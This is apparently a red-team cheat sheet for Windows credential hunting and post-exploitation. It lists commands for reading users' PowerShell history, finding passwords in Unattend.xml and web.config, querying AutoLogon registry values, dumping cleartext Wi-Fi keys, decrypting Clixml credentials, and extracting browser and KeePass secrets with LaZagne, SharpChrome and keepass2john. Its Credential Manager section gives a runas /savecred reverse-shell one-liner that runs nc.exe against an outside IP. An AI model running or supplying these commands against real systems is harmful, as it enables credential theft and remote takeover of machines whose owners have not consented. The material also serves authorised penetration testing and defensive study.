# Credential Hunting & Post-Exploitation
**Concept:** Users and administrators often leave credentials in plaintext or reversibly encrypted formats. Finding these "loose secrets" is often faster and stealthier than kernel exploitation.
## 1. PowerShell History
**Target:** PowerShell (v5+) logs executed commands to a text file. This often contains hardcoded credentials, API keys, or evidence of recent administrative actions. **Location:** `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
```powershell
# Description: Retrieve the history file path and read contents
# Syntax: Get-Content (Get-PSReadLineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Description: Loop through all users (Requires Admin)
foreach($user in ((ls C:\users).fullname)){ type "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue }
```
## 2. Configuration & Unattended Files
**Target:** Installation scripts (`Unattend.xml`) and web application configs (`web.config`) frequently contain administrative passwords or database connection strings.
```powershell
# Description: Search for Unattend.xml (often contains local admin password)
dir /s /b c:\*Unattend.xml*

# Description: Search for web.config files
dir /s /b c:\inetpub\wwwroot\web.config

# Description: Recursive string search for "password" (Noisy - Target specific dirs)
findstr /si "password" *.xml *.ini *.txt *.config
```
## 3. System Artifacts (Registry & Wifi)
### AutoLogon
**Target:** If a machine is configured to log in automatically (kiosks, display boards), credentials are stored in the registry. 
**Registry Path:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
```powershell
# Description: Query AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
### Putty Sessions
**Target:** Saved SSH sessions in Putty often store proxy credentials or usernames. 
**Registry Path:** `HKCU\Software\SimonTatham\PuTTY\Sessions`
```powershell
# Description: Recursive registry query for Putty sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```
### Wifi Profiles
**Target:** WPA2 Pre-Shared Keys stored by the WLAN AutoConfig service.
```powershell
# Description: List saved profiles
netsh wlan show profile

# Description: Dump cleartext key for a specific profile
# Syntax: netsh wlan show profile name="<Profile_Name>" key=clear
netsh wlan show profile name="Corporate_Wifi" key=clear
```
## 4. Windows Vault & CmdKey
**Target:** Windows Credential Manager stores saved RDP and SMB credentials. If `cmdkey /list` shows a saved credential, you can use it without knowing the password via `runas /savecred`.
### Enumeration
```powershell
# Description: List stored credentials
cmdkey /list
```
### Exploitation (RunAs)
If you see `Target: Domain:interactive=Administrator`:
```powershell
# Description: Execute a reverse shell using saved credentials
# Syntax: runas /savecred /user:<Saved_User> <Command>
runas /savecred /user:Administrator "c:\temp\nc.exe 10.10.10.10 443 -e cmd.exe"
```
## 5. Application Secrets
### Sticky Notes
**Target:** Users often paste passwords into Sticky Notes. The data is stored in a SQLite database. 
**Path:** `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
```powershell
# Description: Copy DB files for offline analysis (DB Browser for SQLite)
copy "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*" C:\Temp\
```
### PowerShell Credentials (Clixml)
**Target:** Scripts often import encrypted credentials using `Import-Clixml`. If you are the user who created the file (or have their session), you can decrypt it.
```powershell
# Description: Decrypt a stored PSCredential object
$cred = Import-Clixml -Path 'C:\Scripts\creds.xml'
$cred.GetNetworkCredential().Password
```
### Browser & Manager Extraction
**Tools:** `LaZagne.exe`, `SessionGopher.ps1`, `SharpChrome.exe`.
```powershell
# Description: Run LaZagne to dump all found browser/admin passwords
.\lazagne.exe all

# Description: Extract Chrome logins (Requires SharpChrome)
.\SharpChrome.exe logins /unprotect
```
**KeePass Extraction:** If you find a `.kdbx` file, extract the hash for offline cracking.
```powershell
# Description: Convert kdbx to John format (Run on attacker machine)
python2 keepass2john.py Database.kdbx
```